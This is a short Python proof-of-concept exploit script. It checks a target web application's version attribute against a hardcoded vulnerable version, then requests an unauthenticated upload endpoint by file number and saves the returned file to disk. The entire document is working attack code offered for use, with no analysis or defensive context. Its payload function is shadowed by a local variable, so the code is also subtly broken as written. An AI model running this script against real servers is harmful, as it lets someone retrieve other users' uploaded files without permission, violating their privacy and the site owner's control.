import sys
import requests
from bs4 import BeautifulSoup

target_version = '1.69.60041-activity-published-359927b1'

def check_target(url):
    soup = BeautifulSoup(requests.get(url).content, 'lxml')
    # print(soup)
    try:
        version = soup.html['version']
        print(f'[*] version: {version}')

        version_ref = float(version[0:4])
        version_target = float(target_version[0:4])
        return True if version_ref<=version_target else False
    except:
        print("[-] Failed to get [version]")
        return False

def payload(url, file_number):
    payload = f'{url}/api/uploads/{file_number}/modified-image'
    return payload

def main():
    if len(sys.argv) < 3:
        print("[!] Usage: poc.exe [URL] [file-number] [/path/to/output]")
        return 
    elif len(sys.argv) == 3:
        URL = sys.argv[1]
        file_number = sys.argv[2]
        path_to_output = ''
    elif len(sys.argv) == 4:
        URL = sys.argv[1]
        file_number = sys.argv[2]
        path_to_output = sys.argv[3]

    # check version
    if not check_target(URL):
        print("[-] This target is wrong!")
        return

    # send payload and get result
    '''
        payload: {URL}/api/uploads/{file_number}/modified-image
    '''
    payload = payload(URL, file_number)
    # print(f"[*] payload: {payload}")

    response = requests.get(payload)
    if response.status_code == 200:
        if path_to_output:
            content_type = response.headers.get('Content-Type')
            if 'text/html' in content_type:
                extension = '.html'
            elif 'application/pdf' in content_type:
                extension = '.pdf'
            elif 'image/' in content_type:
                extension = '.'+content_type.split('/')[1]
            else:
                extension = '' 
            file_name = f'{path_to_output}{extension}'
        else:
            file_name = response.headers.get('Content-Disposition').split('filename')[1].strip('=').strip('"')
        # print(file_name)

        # save result
        file_content = response.content
        with open(file_name, "wb") as file:
            file.write(file_content)
        print(f"[+] Successfully downloaded file: {file_name}")

    else:
        print("[-] Failed to connect it!")

if __name__=='__main__':
    main()